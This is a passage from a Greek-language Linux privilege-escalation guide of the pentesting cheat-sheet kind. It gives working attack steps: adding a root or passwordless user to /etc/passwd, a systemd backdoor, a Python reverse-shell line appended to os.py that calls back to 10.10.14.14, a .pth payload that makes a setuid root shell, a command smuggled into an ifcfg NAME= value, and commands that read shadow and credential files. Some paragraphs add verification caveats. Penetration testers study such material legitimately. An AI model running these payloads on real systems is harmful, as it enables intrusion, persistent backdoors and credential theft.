Η προώθηση του SSH agent σάς επιτρέπει να **χρησιμοποιείτε τα τοπικά SSH keys αντί να αφήνετε keys** (χωρίς passphrases!) αποθηκευμένα στον server σας. Έτσι, θα μπορείτε να **μεταβείτε** μέσω ssh **σε έναν host** και από εκεί να **μεταβείτε σε άλλον** host **χρησιμοποιώντας** το **key** που βρίσκεται στον **αρχικό host**.

Πρέπει να ορίσετε αυτή την επιλογή στο `$HOME/.ssh.config` ως εξής:

```
Host example.com
  ForwardAgent yes
```

Notice ότι αν το `Host` είναι `*`, κάθε φορά που ο χρήστης μεταβαίνει σε διαφορετικό μηχάνημα, αυτός ο host θα μπορεί να έχει πρόσβαση στα κλειδιά (κάτι που αποτελεί ζήτημα ασφάλειας).

Το αρχείο `/etc/ssh_config` μπορεί να **παρακάμψει** αυτές τις **επιλογές** και να επιτρέψει ή να απαγορεύσει αυτήν τη ρύθμιση.\
Το αρχείο `/etc/sshd_config` μπορεί να **επιτρέψει** ή να **απαγορεύσει** την προώθηση του ssh-agent με τη λέξη-κλειδί `AllowAgentForwarding` (η προεπιλογή είναι η επιτρέπεται).

Αν διαπιστώσετε ότι το Forward Agent είναι ρυθμισμένο σε ένα περιβάλλον, δείτε την ακόλουθη σελίδα, καθώς **ενδέχεται να μπορείτε να το εκμεταλλευτείτε για κλιμάκωση προνομίων**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Ενδιαφέροντα αρχεία

### Αρχεία profile

Το αρχείο `/etc/profile` και τα αρχεία στον κατάλογο `/etc/profile.d/` είναι **scripts που εκτελούνται όταν ένας χρήστης ανοίγει ένα νέο shell**. Επομένως, αν μπορείτε να **γράψετε ή να τροποποιήσετε οποιοδήποτε από αυτά, μπορείτε να κλιμακώσετε τα προνόμιά σας**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Αν εντοπιστεί κάποιο ύποπτο script προφίλ, θα πρέπει να το ελέγξεις για **ευαίσθητες πληροφορίες**.

### Αρχεία Passwd/Shadow

Ανάλογα με το λειτουργικό σύστημα, τα αρχεία `/etc/passwd` και `/etc/shadow` μπορεί να έχουν διαφορετικό όνομα ή να υπάρχει κάποιο αντίγραφο ασφαλείας. Επομένως, συνιστάται να **τα εντοπίσεις όλα** και να **ελέγξεις αν μπορείς να τα διαβάσεις**, για να δεις **αν περιέχουν hashes**:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

Σε ορισμένες περιπτώσεις, μπορείτε να βρείτε **hashes κωδικών πρόσβασης** μέσα στο αρχείο `/etc/passwd` (ή σε αντίστοιχο αρχείο)

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### Εγγράψιμο /etc/passwd

Αρχικά, δημιουργήστε έναν κωδικό πρόσβασης με μία από τις ακόλουθες εντολές.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Στη συνέχεια, προσθέστε τον χρήστη `hacker` και ορίστε τον κωδικό πρόσβασης που δημιουργήθηκε.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Π.χ.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Τώρα μπορείτε να χρησιμοποιήσετε την εντολή `su` με το `hacker:hacker`

Εναλλακτικά, μπορείτε να χρησιμοποιήσετε τις παρακάτω γραμμές για να προσθέσετε έναν δοκιμαστικό χρήστη χωρίς κωδικό πρόσβασης.\
ΠΡΟΕΙΔΟΠΟΙΗΣΗ: μπορεί να μειώσετε την τρέχουσα ασφάλεια του συστήματος.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

ΣΗΜΕΙΩΣΗ: Στις πλατφόρμες BSD, το `/etc/passwd` βρίσκεται στα `/etc/pwd.db` και `/etc/master.passwd`, ενώ το `/etc/shadow` έχει μετονομαστεί σε `/etc/spwd.db`.

Θα πρέπει να ελέγξετε αν μπορείτε να **γράψετε σε κάποια ευαίσθητα αρχεία**. Για παράδειγμα, μπορείτε να γράψετε σε κάποιο **αρχείο ρυθμίσεων υπηρεσίας**;

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Για παράδειγμα, αν το μηχάνημα εκτελεί έναν **tomcat** server και μπορείς να **τροποποιήσεις το αρχείο ρυθμίσεων της υπηρεσίας Tomcat μέσα στο /etc/systemd/,** τότε μπορείς να τροποποιήσεις τις γραμμές:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Η backdoor θα εκτελεστεί την επόμενη φορά που θα ξεκινήσει το tomcat.

### Έλεγχος φακέλων

Οι παρακάτω φάκελοι μπορεί να περιέχουν backups ή ενδιαφέρουσες πληροφορίες: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Πιθανότατα δεν θα μπορέσεις να διαβάσεις τον τελευταίο, αλλά δοκίμασε)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Ασυνήθιστες τοποθεσίες/αρχεία που ανήκουν στον χρήστη

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### Αρχεία που τροποποιήθηκαν τα τελευταία λεπτά

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Αρχεία βάσεων δεδομένων Sqlite

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

Για βάσεις δεδομένων εφαρμογών που είναι αναγνώσιμες, ελέγξτε τα ονόματα των πινάκων και των στηλών για usernames και password hashes. Η εύρεση ενός hash, η ανάκτηση του κωδικού πρόσβασής του και η απόδειξη ότι χρησιμοποιείται και για έναν τοπικό λογαριασμό είναι ξεχωριστά βήματα· μια γενική δεκαεξαδική συμβολοσειρά 32 χαρακτήρων δεν αρκεί για να συμπεράνουμε ότι πρόκειται για MD5 ή ότι παρέχει πρόσβαση στον λογαριασμό.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

Αν ένα αναγνώσιμο ιστορικό κελύφους περιέχει μια εντολή `sudo` και ακολουθεί μια σύντομη γραμμή που μοιάζει με κωδικό πρόσβασης, ελέγξτε χειροκίνητα τις γύρω γραμμές. Ένας κωδικός πρόσβασης που πληκτρολογείται στη συνηθισμένη προτροπή του `sudo` δεν αποθηκεύεται στο ιστορικό του κελύφους· μια επόμενη γραμμή είναι απλώς πιθανή ακούσια είσοδος στο κέλυφος και όχι απόδειξη έγκυρου κωδικού πρόσβασης. Το αρχείο-δείκτης `.sudo_as_admin_successful` καταγράφει προηγούμενη χρήση, όχι τρέχουσα εξουσιοδότηση.

### Κρυφά αρχεία

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **Script/Δυαδικά αρχεία στο PATH**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Αρχεία web**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Αντίγραφα ασφαλείας**

Ελέγξτε τα αναγνώσιμα αρχεία μέσα σε καταλόγους αντιγράφων ασφαλείας, καθώς και αρχεία των οποίων τα **ονόματα** περιέχουν τη λέξη `backup`: ένα αρχείο με μη περιγραφικό όνομα ή κρυπτογραφημένη επέκταση μπορεί και πάλι να εκθέτει παλιά δεδομένα εφαρμογών. Ένα κρυπτογραφημένο αρχείο αποτελεί μόνο πιθανή έκθεση. Η ανάκτηση του κωδικού πρόσβασης, η εξέταση των περιεχομένων του, η ανάκτηση ενός hash εφαρμογής και η επαναχρησιμοποίηση αυτού του κωδικού για λογαριασμό Unix είναι ξεχωριστά βήματα που πρέπει να επαληθευτούν· η ύπαρξη ενός hash σε αρχείο δεν αποδεικνύει ότι είναι δυνατή η τοπική σύνδεση.

Τα αναγνώσιμα αντίγραφα ασφαλείας εικονικών μηχανών απαιτούν αντίστοιχο έλεγχο. Ένα αρχείο ρυθμίσεων VirtualBox `.vbox` μπορεί να προσδιορίζει συνδεδεμένες εικόνες `.vdi` και να περιέχει μεταδεδομένα κλειδιού κρυπτογράφησης δίσκου· [η τεκμηρίωση του VirtualBox αναφέρει ότι το κρυπτογραφημένο κλειδί δεδομένων αποθηκεύεται στις ρυθμίσεις της εικονικής μηχανής](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). Τόσο το αρχείο ρυθμίσεων όσο και η εικόνα πρέπει να είναι προσβάσιμα για να είναι δυνατός ο offline έλεγχος του δίσκου. Ένας τόμος του guest μπορεί να διαθέτει το δικό του [επίπεδο κρυπτογράφησης LUKS](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc), για το οποίο απαιτείται ξεχωριστό κλειδί. Ακόμη και μετά από εξουσιοδοτημένη αποκρυπτογράφηση, παλιά scripts ή αρχεία ρυθμίσεων μπορεί να περιέχουν κωδικό πρόσβασης· βεβαιωθείτε ότι τα διαπιστευτήρια είναι σε ισχύ για λογαριασμό του host και ότι η ισχύουσα πολιτική `sudo` επιτρέπει την εκτέλεση μιας προνομιούχας εντολής, πριν το χαρακτηρίσετε τοπική κλιμάκωση προνομίων. Κατά το παθητικό enumeration, καταγράψτε διαδρομές και δικαιώματα χωρίς να αντιγράψετε, να αποκρυπτογραφήσετε ή να προσαρτήσετε εικόνες.

Κατά την εξέταση ενός αναγνώσιμου αρχείου, απαριθμήστε πρώτα τα ονόματα των μελών του πριν εξαγάγετε οτιδήποτε: μπορεί να υπάρχουν κρυφά αρχεία authenticator, υλικό κωδικών ανάκτησης ή κλειδιά SSH, ακόμη κι αν τα ενεργά αντίγραφά τους είναι προστατευμένα. Τα ονόματα αρχείων αποτελούν μόνο μια ένδειξη· επαληθεύστε ξεχωριστά το υλικό και τυχόν επαναχρησιμοποίηση λογαριασμού.

Δώστε προτεραιότητα σε **αναγνώσιμα αρχεία που ανήκουν σε άλλον χρήστη** και βρίσκονται σε καταλόγους αντιγράφων ασφαλείας, ειδικά σε αρχεία με ιδιοκτήτη τον root και σε όσα είναι προσβάσιμα μέσω συμμετοχής σε ομάδα. Ένα παλιό αρχείο μπορεί να περιέχει ρυθμίσεις ή μυστικό αυθεντικοποίησης, ακόμη κι όταν το ενεργό αντίγραφο είναι προστατευμένο. Για ένα τοπικό UI δημιουργίας αντιγράφων ασφαλείας, όπως το [Backrest](https://garethgeorge.github.io/backrest/), ελέγξτε τον πραγματικό λογαριασμό της υπηρεσίας και αν ένας χρήστης με χαμηλότερα προνόμια μπορεί να διαβάσει τις ρυθμίσεις της ή να αυθεντικοποιηθεί στο UI. Τα [hooks](https://garethgeorge.github.io/backrest/docs/hooks) του και η [διεπαφή εντολών restic](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) μπορούν να εκτελούνται με τα δικαιώματα αρχείων και εντολών του daemon· ένας listener loopback από μόνος του δεν καθορίζει τον αντίκτυπο. Το `passwordBcrypt` του Backrest είναι hash bcrypt κωδικοποιημένο σε base64 στον [κώδικα αυθεντικοποίησής του](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go), όχι κωδικός πρόσβασης σε απλό κείμενο. Επιβεβαιώστε την ταυτότητα της υπηρεσίας, την ύπαρξη έγκυρων διαπιστευτηρίων και την πρόσβαση στο σχετικό πλάνο ή αποθετήριο, πριν θεωρήσετε ένα εκτεθειμένο αρχείο ή UI όριο προνομίων.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Γνωστά αρχεία που περιέχουν κωδικούς πρόσβασης

Διάβασε τον κώδικα του [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), καθώς αναζητά **αρκετά πιθανά αρχεία που θα μπορούσαν να περιέχουν κωδικούς πρόσβασης**.\
**Ένα άλλο ενδιαφέρον εργαλείο** που μπορείς να χρησιμοποιήσεις είναι το [**LaZagne**](https://github.com/AlessandroZ/LaZagne), μια εφαρμογή ανοιχτού κώδικα που χρησιμοποιείται για την ανάκτηση πολλών κωδικών πρόσβασης αποθηκευμένων σε έναν τοπικό υπολογιστή με Windows, Linux ή Mac.

Αν το `/etc/guacamole/guacamole.properties` είναι αναγνώσιμο, έλεγξε τις ρυθμίσεις σύνδεσης βάσης δεδομένων `mysql-*`, `postgresql-*` ή `sqlserver-*`. Αν ο λογαριασμός έχει εξουσιοδότηση ανάγνωσης των πινάκων Guacamole JDBC, το `guacamole_connection_parameter` μπορεί να περιέχει αποθηκευμένες τιμές SSH για `username`, `password`, `private-key` ή `passphrase`. Ξεκίνα από τα connection IDs και τα ονόματα παραμέτρων και, στη συνέχεια, εξέτασε μόνο τις σχετικές γραμμές· μια αποθηκευμένη τιμή μπορεί να είναι ένα δυναμικό token ή μια αναφορά σε vault, αντί για ένα επαναχρησιμοποιήσιμο μυστικό. Δες το [Guacamole JDBC schema](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) και τις [SSH connection parameters](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).

Ο [pswm password manager](https://github.com/Julynx/pswm#usage) αποθηκεύει από προεπιλογή ένα κρυπτογραφημένο vault στη διαδρομή `~/.local/share/pswm/pswm`. Αν είναι ορατό το vault κάποιου άλλου χρήστη, έλεγξε τον ιδιοκτήτη του και αν ο λογαριασμός σου μπορεί πράγματι να το διαβάσει. Η διαδρομή του vault από μόνη της δεν αποκαλύπτει διαπιστευτήρια· η ανάκτηση του master password του, η εύρεση ενός επαναχρησιμοποιήσιμου κωδικού πρόσβασης λογαριασμού και η επιβεβαίωση των δικαιωμάτων αυτού του λογαριασμού είναι ξεχωριστά βήματα.

Η [Passpie's default database](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) είναι η `~/.passpie/`, με ένα keyring `.keys` και κρυπτογραφημένα αρχεία διαπιστευτηρίων `.pass` σε καταλόγους ομάδων. Ένας ορατός κατάλογος βάσης δεδομένων αποτελεί απλώς ένδειξη διαδρομής: επιβεβαίωσε την πρόσβαση στο κλειδί και στη σχετική κρυπτογραφημένη εγγραφή, τυχόν απαιτούμενη κύρια φράση πρόσβασης και αν το διαπιστευτήριο που ανακτήθηκε ανήκει σε λογαριασμό με περισσότερα προνόμια. Το Passpie υποστηρίζει επίσης [custom database paths](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases), επομένως η προεπιλεγμένη διαδρομή δεν καλύπτει όλες τις περιπτώσεις. Η αυτοματοποιημένη απαρίθμηση πρέπει να καταγράφει μεταδεδομένα χωρίς να εξάγει διαπιστευτήρια ή να εμφανίζει υλικό κλειδιών.

### Αρχεία καταγραφής

Αν μπορείς να διαβάσεις αρχεία καταγραφής, ίσως βρεις **ενδιαφέρουσες/εμπιστευτικές πληροφορίες μέσα σε αυτά**. Όσο πιο παράξενο είναι το αρχείο καταγραφής, τόσο πιο ενδιαφέρον θα είναι (πιθανότατα).\
Επίσης, ορισμένα «**κακώς**» ρυθμισμένα (με backdoor;) **αρχεία καταγραφής audit** μπορεί να σου επιτρέψουν να **καταγράψεις κωδικούς πρόσβασης** μέσα στα αρχεία καταγραφής audit, όπως εξηγείται σε αυτήν την ανάρτηση: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Για την **ανάγνωση αρχείων καταγραφής**, η ομάδα [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) θα είναι πολύ χρήσιμη.

### Αρχεία Shell

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Αναζήτηση γενικών διαπιστευτηρίων/Regex

Θα πρέπει επίσης να ελέγχεις για αρχεία που περιέχουν τη λέξη "**password**" είτε στο **όνομά** τους είτε στο περιεχόμενό τους, καθώς και για IP και email μέσα σε logs ή για regex hashes.\
Δεν θα αναφέρω εδώ πώς να τα κάνεις όλα αυτά, αλλά αν ενδιαφέρεσαι, μπορείς να ελέγξεις τους τελευταίους ελέγχους που εκτελεί το [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Εγγράψιμα αρχεία

### Python library hijacking

Αν γνωρίζεις **από πού** θα εκτελεστεί ένα python script και **μπορείς να γράψεις μέσα** σε αυτόν τον φάκελο ή να **τροποποιήσεις python libraries**, μπορείς να τροποποιήσεις τη βιβλιοθήκη os του λειτουργικού συστήματος και να την κάνεις backdoor (αν μπορείς να γράψεις στον φάκελο από όπου θα εκτελεστεί το python script, κάνε copy-paste τη βιβλιοθήκη os.py).

Για να **κάνεις backdoor τη βιβλιοθήκη**, απλώς πρόσθεσε στο τέλος της βιβλιοθήκης os.py την ακόλουθη γραμμή (άλλαξε την IP και το PORT):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

#### Εγγράψιμο `.pth` που επεξεργάζεται το `site.addsitedir()`

Μην θεωρείτε ότι το `site.addsitedir(DIR)` είναι ισοδύναμο με το `sys.path.append(DIR)`. Επεξεργάζεται επίσης κάθε αρχείο `*.pth` στο `DIR`. Μια γραμμή που αρχίζει με `import` και ακολουθείται από κενό ή tab εκτελείται ως κώδικας Python. Οι γραμμές με paths επιλύονται σε σχέση με τον κατάλογο site και προστίθενται μόνο αν υπάρχουν.<sup>[[38]](#references)</sup>

Αυτό οδηγεί σε privilege escalation όταν ένα πρόγραμμα Python που επιτρέπεται να εκτελεστεί με sudo ή έχει με άλλο τρόπο προνόμια καλεί το `site.addsitedir()` σε κατάλογο εγγράψιμο από τον τρέχοντα χρήστη ή από κάποια ομάδα του. Ο κώδικας του `.pth` εκτελείται καθώς το πρόγραμμα με προνόμια ρυθμίζει το import path, πριν από την κανονική εκτέλεσή του.<sup>[[38]](#references)[[39]](#references)</sup>

```bash
# Find explicit consumers and inspect every selected directory's ownership
grep -R "site\.addsitedir" /opt /usr/local 2>/dev/null
namei -l /opt/app/plugins/dev
find /opt/app/plugins/dev -maxdepth 1 -type f -name '*.pth' -ls

# Verify execution through a one-line path configuration file
printf '%s\n' "import os; os.system('id')" > /opt/app/plugins/dev/probe.pth
sudo /usr/bin/python3 /opt/app/controller.py status
```

Το εκτελέσιμο περιεχόμενο `.pth` πρέπει να χωρά σε μία γραμμή, αλλά τα ερωτηματικά επιτρέπουν πολλές εντολές. Για παράδειγμα, μια διαδρομή εκτέλεσης ως root μπορεί να δημιουργήσει ένα αντίγραφο του Bash με setuid· εκκινήστε το Bash με `-p`, ώστε να διατηρεί το effective ID του.<sup>[[39]](#references)</sup>

```bash
printf '%s\n' "import os; os.system('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell')" \
  > /opt/app/plugins/dev/pwn.pth
sudo /usr/bin/python3 /opt/app/controller.py status
/tmp/rootshell -p
```

Η επιλογή `-S` απενεργοποιεί μόνο την αυτόματη αρχικοποίηση του `site` από την Python. Δεν προστατεύει ένα πρόγραμμα που εισάγει ρητά το `site` και καλεί `site.addsitedir()`. Αφαιρέστε τους καταλόγους στους οποίους μπορεί να γράψει ο επιτιθέμενος από τις διαδρομές εισαγωγής προνομιακών διεργασιών και απαιτήστε ο κατάλογος και τα αρχεία `.pth` του να ανήκουν αποκλειστικά στον προνομιούχο διαχειριστή, ο οποίος θα έχει και αποκλειστικά δικαίωμα εγγραφής.<sup>[[38]](#references)[[39]](#references)</sup>

### Εκμετάλλευση logrotate

Μια προνομιακή εργασία `logrotate` μπορεί να δημιουργήσει διαδρομή εγγραφής αρχείου μεταξύ χρηστών, όταν περιστρέφει πράγματι ένα αρχείο καταγραφής κάτω από κατάλογο που χρήστης με χαμηλότερα προνόμια μπορεί να αντικαταστήσει ή να ανακατευθύνει κατά τη διάρκεια της περιστροφής. Ένα αρχείο καταγραφής στο οποίο μπορεί να γίνει εγγραφή είναι απλώς μια ένδειξη. Επιβεβαιώστε τον ακριβή ενεργό κανόνα και τις οδηγίες `create`, `olddir` και `su`, την ταυτότητα με την οποία εκτελείται ο προγραμματιστής εργασιών, τα δικαιώματα εγγραφής και αναζήτησης στον γονικό κατάλογο του αρχείου καταγραφής, καθώς και αν η εγκατεστημένη έκδοση και πολιτική επιτρέπουν την αλλαγή του προορισμού. Για να μετατραπεί η εγγραφή σε αρχείο εκκίνησης σε εκτέλεση εντολών, ένα μεταγενέστερο προνομιακό shell πρέπει επίσης να φορτώσει το αρχείο που προέκυψε. Εξετάστε το πρόγραμμα εκτέλεσης, τον κανόνα, την έκδοση/συσκευασία και τα μεταδεδομένα της διαδρομής, χωρίς να προκαλέσετε περιστροφή ή να επιχειρήσετε το race.

> [!TIP]
> Μην αντιμετωπίζετε την έκδοση `3.18.0` ή οποιαδήποτε συμβολοσειρά έκδοσης από μόνη της ως όριο εκμεταλλευσιμότητας. Το [αρχείο αλλαγών του upstream](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) καταγράφει ενισχύσεις προστασίας καταλόγων και symlink σε πολλές εκδόσεις, ενώ οι διανομές μπορεί να έχουν κάνει backport διορθώσεων. Το [εγχειρίδιο του upstream](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) συνιστά τη χρήση του `su` όταν το root περιστρέφει αρχεία καταγραφής σε καταλόγους που ελέγχονται από χρήστες χωρίς προνόμια· επαληθεύστε τον ενεργό κανόνα και την πραγματική συμπεριφορά.

Περισσότερες λεπτομέρειες σχετικά με την ευπάθεια θα βρείτε σε αυτήν τη σελίδα: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Μπορείτε να εκμεταλλευτείτε αυτήν την ευπάθεια με το [**logrotten**](https://github.com/whotwagner/logrotten).

Αυτή η ευπάθεια είναι πολύ παρόμοια με την [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(αρχεία καταγραφής nginx),** οπότε κάθε φορά που διαπιστώνετε ότι μπορείτε να τροποποιήσετε αρχεία καταγραφής, ελέγξτε ποιος τα διαχειρίζεται και αν μπορείτε να κλιμακώσετε προνόμια αντικαθιστώντας τα αρχεία καταγραφής με symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Αναφορά ευπάθειας:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Ένα αρχείο `ifcfg-*` αποτελεί ένδειξη προς διερεύνηση όταν ένας χρήστης με χαμηλότερα προνόμια μπορεί να το δημιουργήσει ή να το τροποποιήσει **και** μια προνομιακή διαδικασία ενεργοποίησης δικτύου θα διαβάσει το συγκεκριμένο αρχείο. Επιβεβαιώστε τα πραγματικά δικαιώματα του αρχείου και του καταλόγου, την επιλεγμένη διεπαφή, την εγκατεστημένη υλοποίηση των `ifup`/`ifdown` και ποιος τα εκτελεί. Ένα αρχείο στο οποίο μπορεί να γίνει εγγραφή δεν προκαλεί από μόνο του εκτέλεση. Ο [οδηγός δικτύωσης RHEL 7 της Red Hat](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) διακρίνει τα παλαιού τύπου network scripts από το NetworkManager: το δεύτερο δεν ενεργοποιεί από μόνο του τα πρώτα. Η [τεκμηρίωση του RHEL 8](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) αναφέρει ότι τα προεπιλεγμένα `ifup`/`ifdown` χρησιμοποιούν το NetworkManager, ενώ το προαιρετικό πακέτο παλαιού τύπου παρέχει shell scripts.

Σε ένα σύστημα που χρησιμοποιεί πράγματι προνομιακά scripts παλαιού τύπου, μια ανάθεση `ifcfg-*` που φορτώνεται από το shell χωρίς εισαγωγικά, όπως `NAME=`, μπορεί να περάσει το όριο εκτέλεσης κώδικα. Επαληθεύστε τον ακριβή parser, την τιμή και τη διαδρομή ενεργοποίησης· μην συμπεραίνετε ότι γίνεται ερμηνεία από το shell μόνο από το όνομα του αρχείου ή την παρουσία του NetworkManager. Ένα wrapper που επιτρέπεται μέσω sudo, γράφει τα δεδομένα εισόδου του καλούντος σε αρχείο `ifcfg-*` και στη συνέχεια καλεί το παλαιού τύπου `ifup` αποτελεί ξεχωριστή διαδρομή προς αυτό το όριο, ακόμη και όταν ο καλών δεν μπορεί να επεξεργαστεί απευθείας το αρχείο.

Για παράδειγμα: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Σημειώστε το κενό ανάμεσα στα Network και /bin/id_)

### **init, init.d, systemd και rc.d**

Ο κατάλογος `/etc/init.d` περιέχει **scripts** για το System V init (SysVinit), το **κλασικό σύστημα διαχείρισης υπηρεσιών Linux**. Περιλαμβάνει scripts για `start`, `stop`, `restart` και, μερικές φορές, `reload` υπηρεσιών. Μπορείτε να τα εκτελέσετε απευθείας ή μέσω συμβολικών συνδέσμων που βρίσκονται στο `/etc/rc?.d/`. Στα συστήματα Redhat υπάρχει και η εναλλακτική διαδρομή `/etc/rc.d/init.d`.

Από την άλλη, το `/etc/init` σχετίζεται με το **Upstart**, ένα νεότερο **σύστημα διαχείρισης υπηρεσιών** που εισήγαγε το Ubuntu και χρησιμοποιεί αρχεία διαμόρφωσης για εργασίες διαχείρισης υπηρεσιών. Παρά τη μετάβαση στο Upstart, τα scripts του SysVinit εξακολουθούν να χρησιμοποιούνται παράλληλα με τις διαμορφώσεις του Upstart, χάρη σε ένα επίπεδο συμβατότητας του Upstart.

Το **systemd** είναι ένας σύγχρονος διαχειριστής αρχικοποίησης και υπηρεσιών, με προηγμένες δυνατότητες όπως εκκίνηση daemon κατ' απαίτηση, διαχείριση automount και στιγμιότυπα κατάστασης συστήματος. Οργανώνει τα αρχεία στους καταλόγους `/usr/lib/systemd/` για τα πακέτα διανομής και `/etc/systemd/system/` για τις τροποποιήσεις διαχειριστών, απλοποιώντας τη διαχείριση του συστήματος.<sup>[[21]](#references)</sup>

## Άλλα κόλπα

### Κλιμάκωση προνομίων μέσω NFS


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Διαφυγή από περιορισμένα Shells


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: κατάχρηση manager-channel

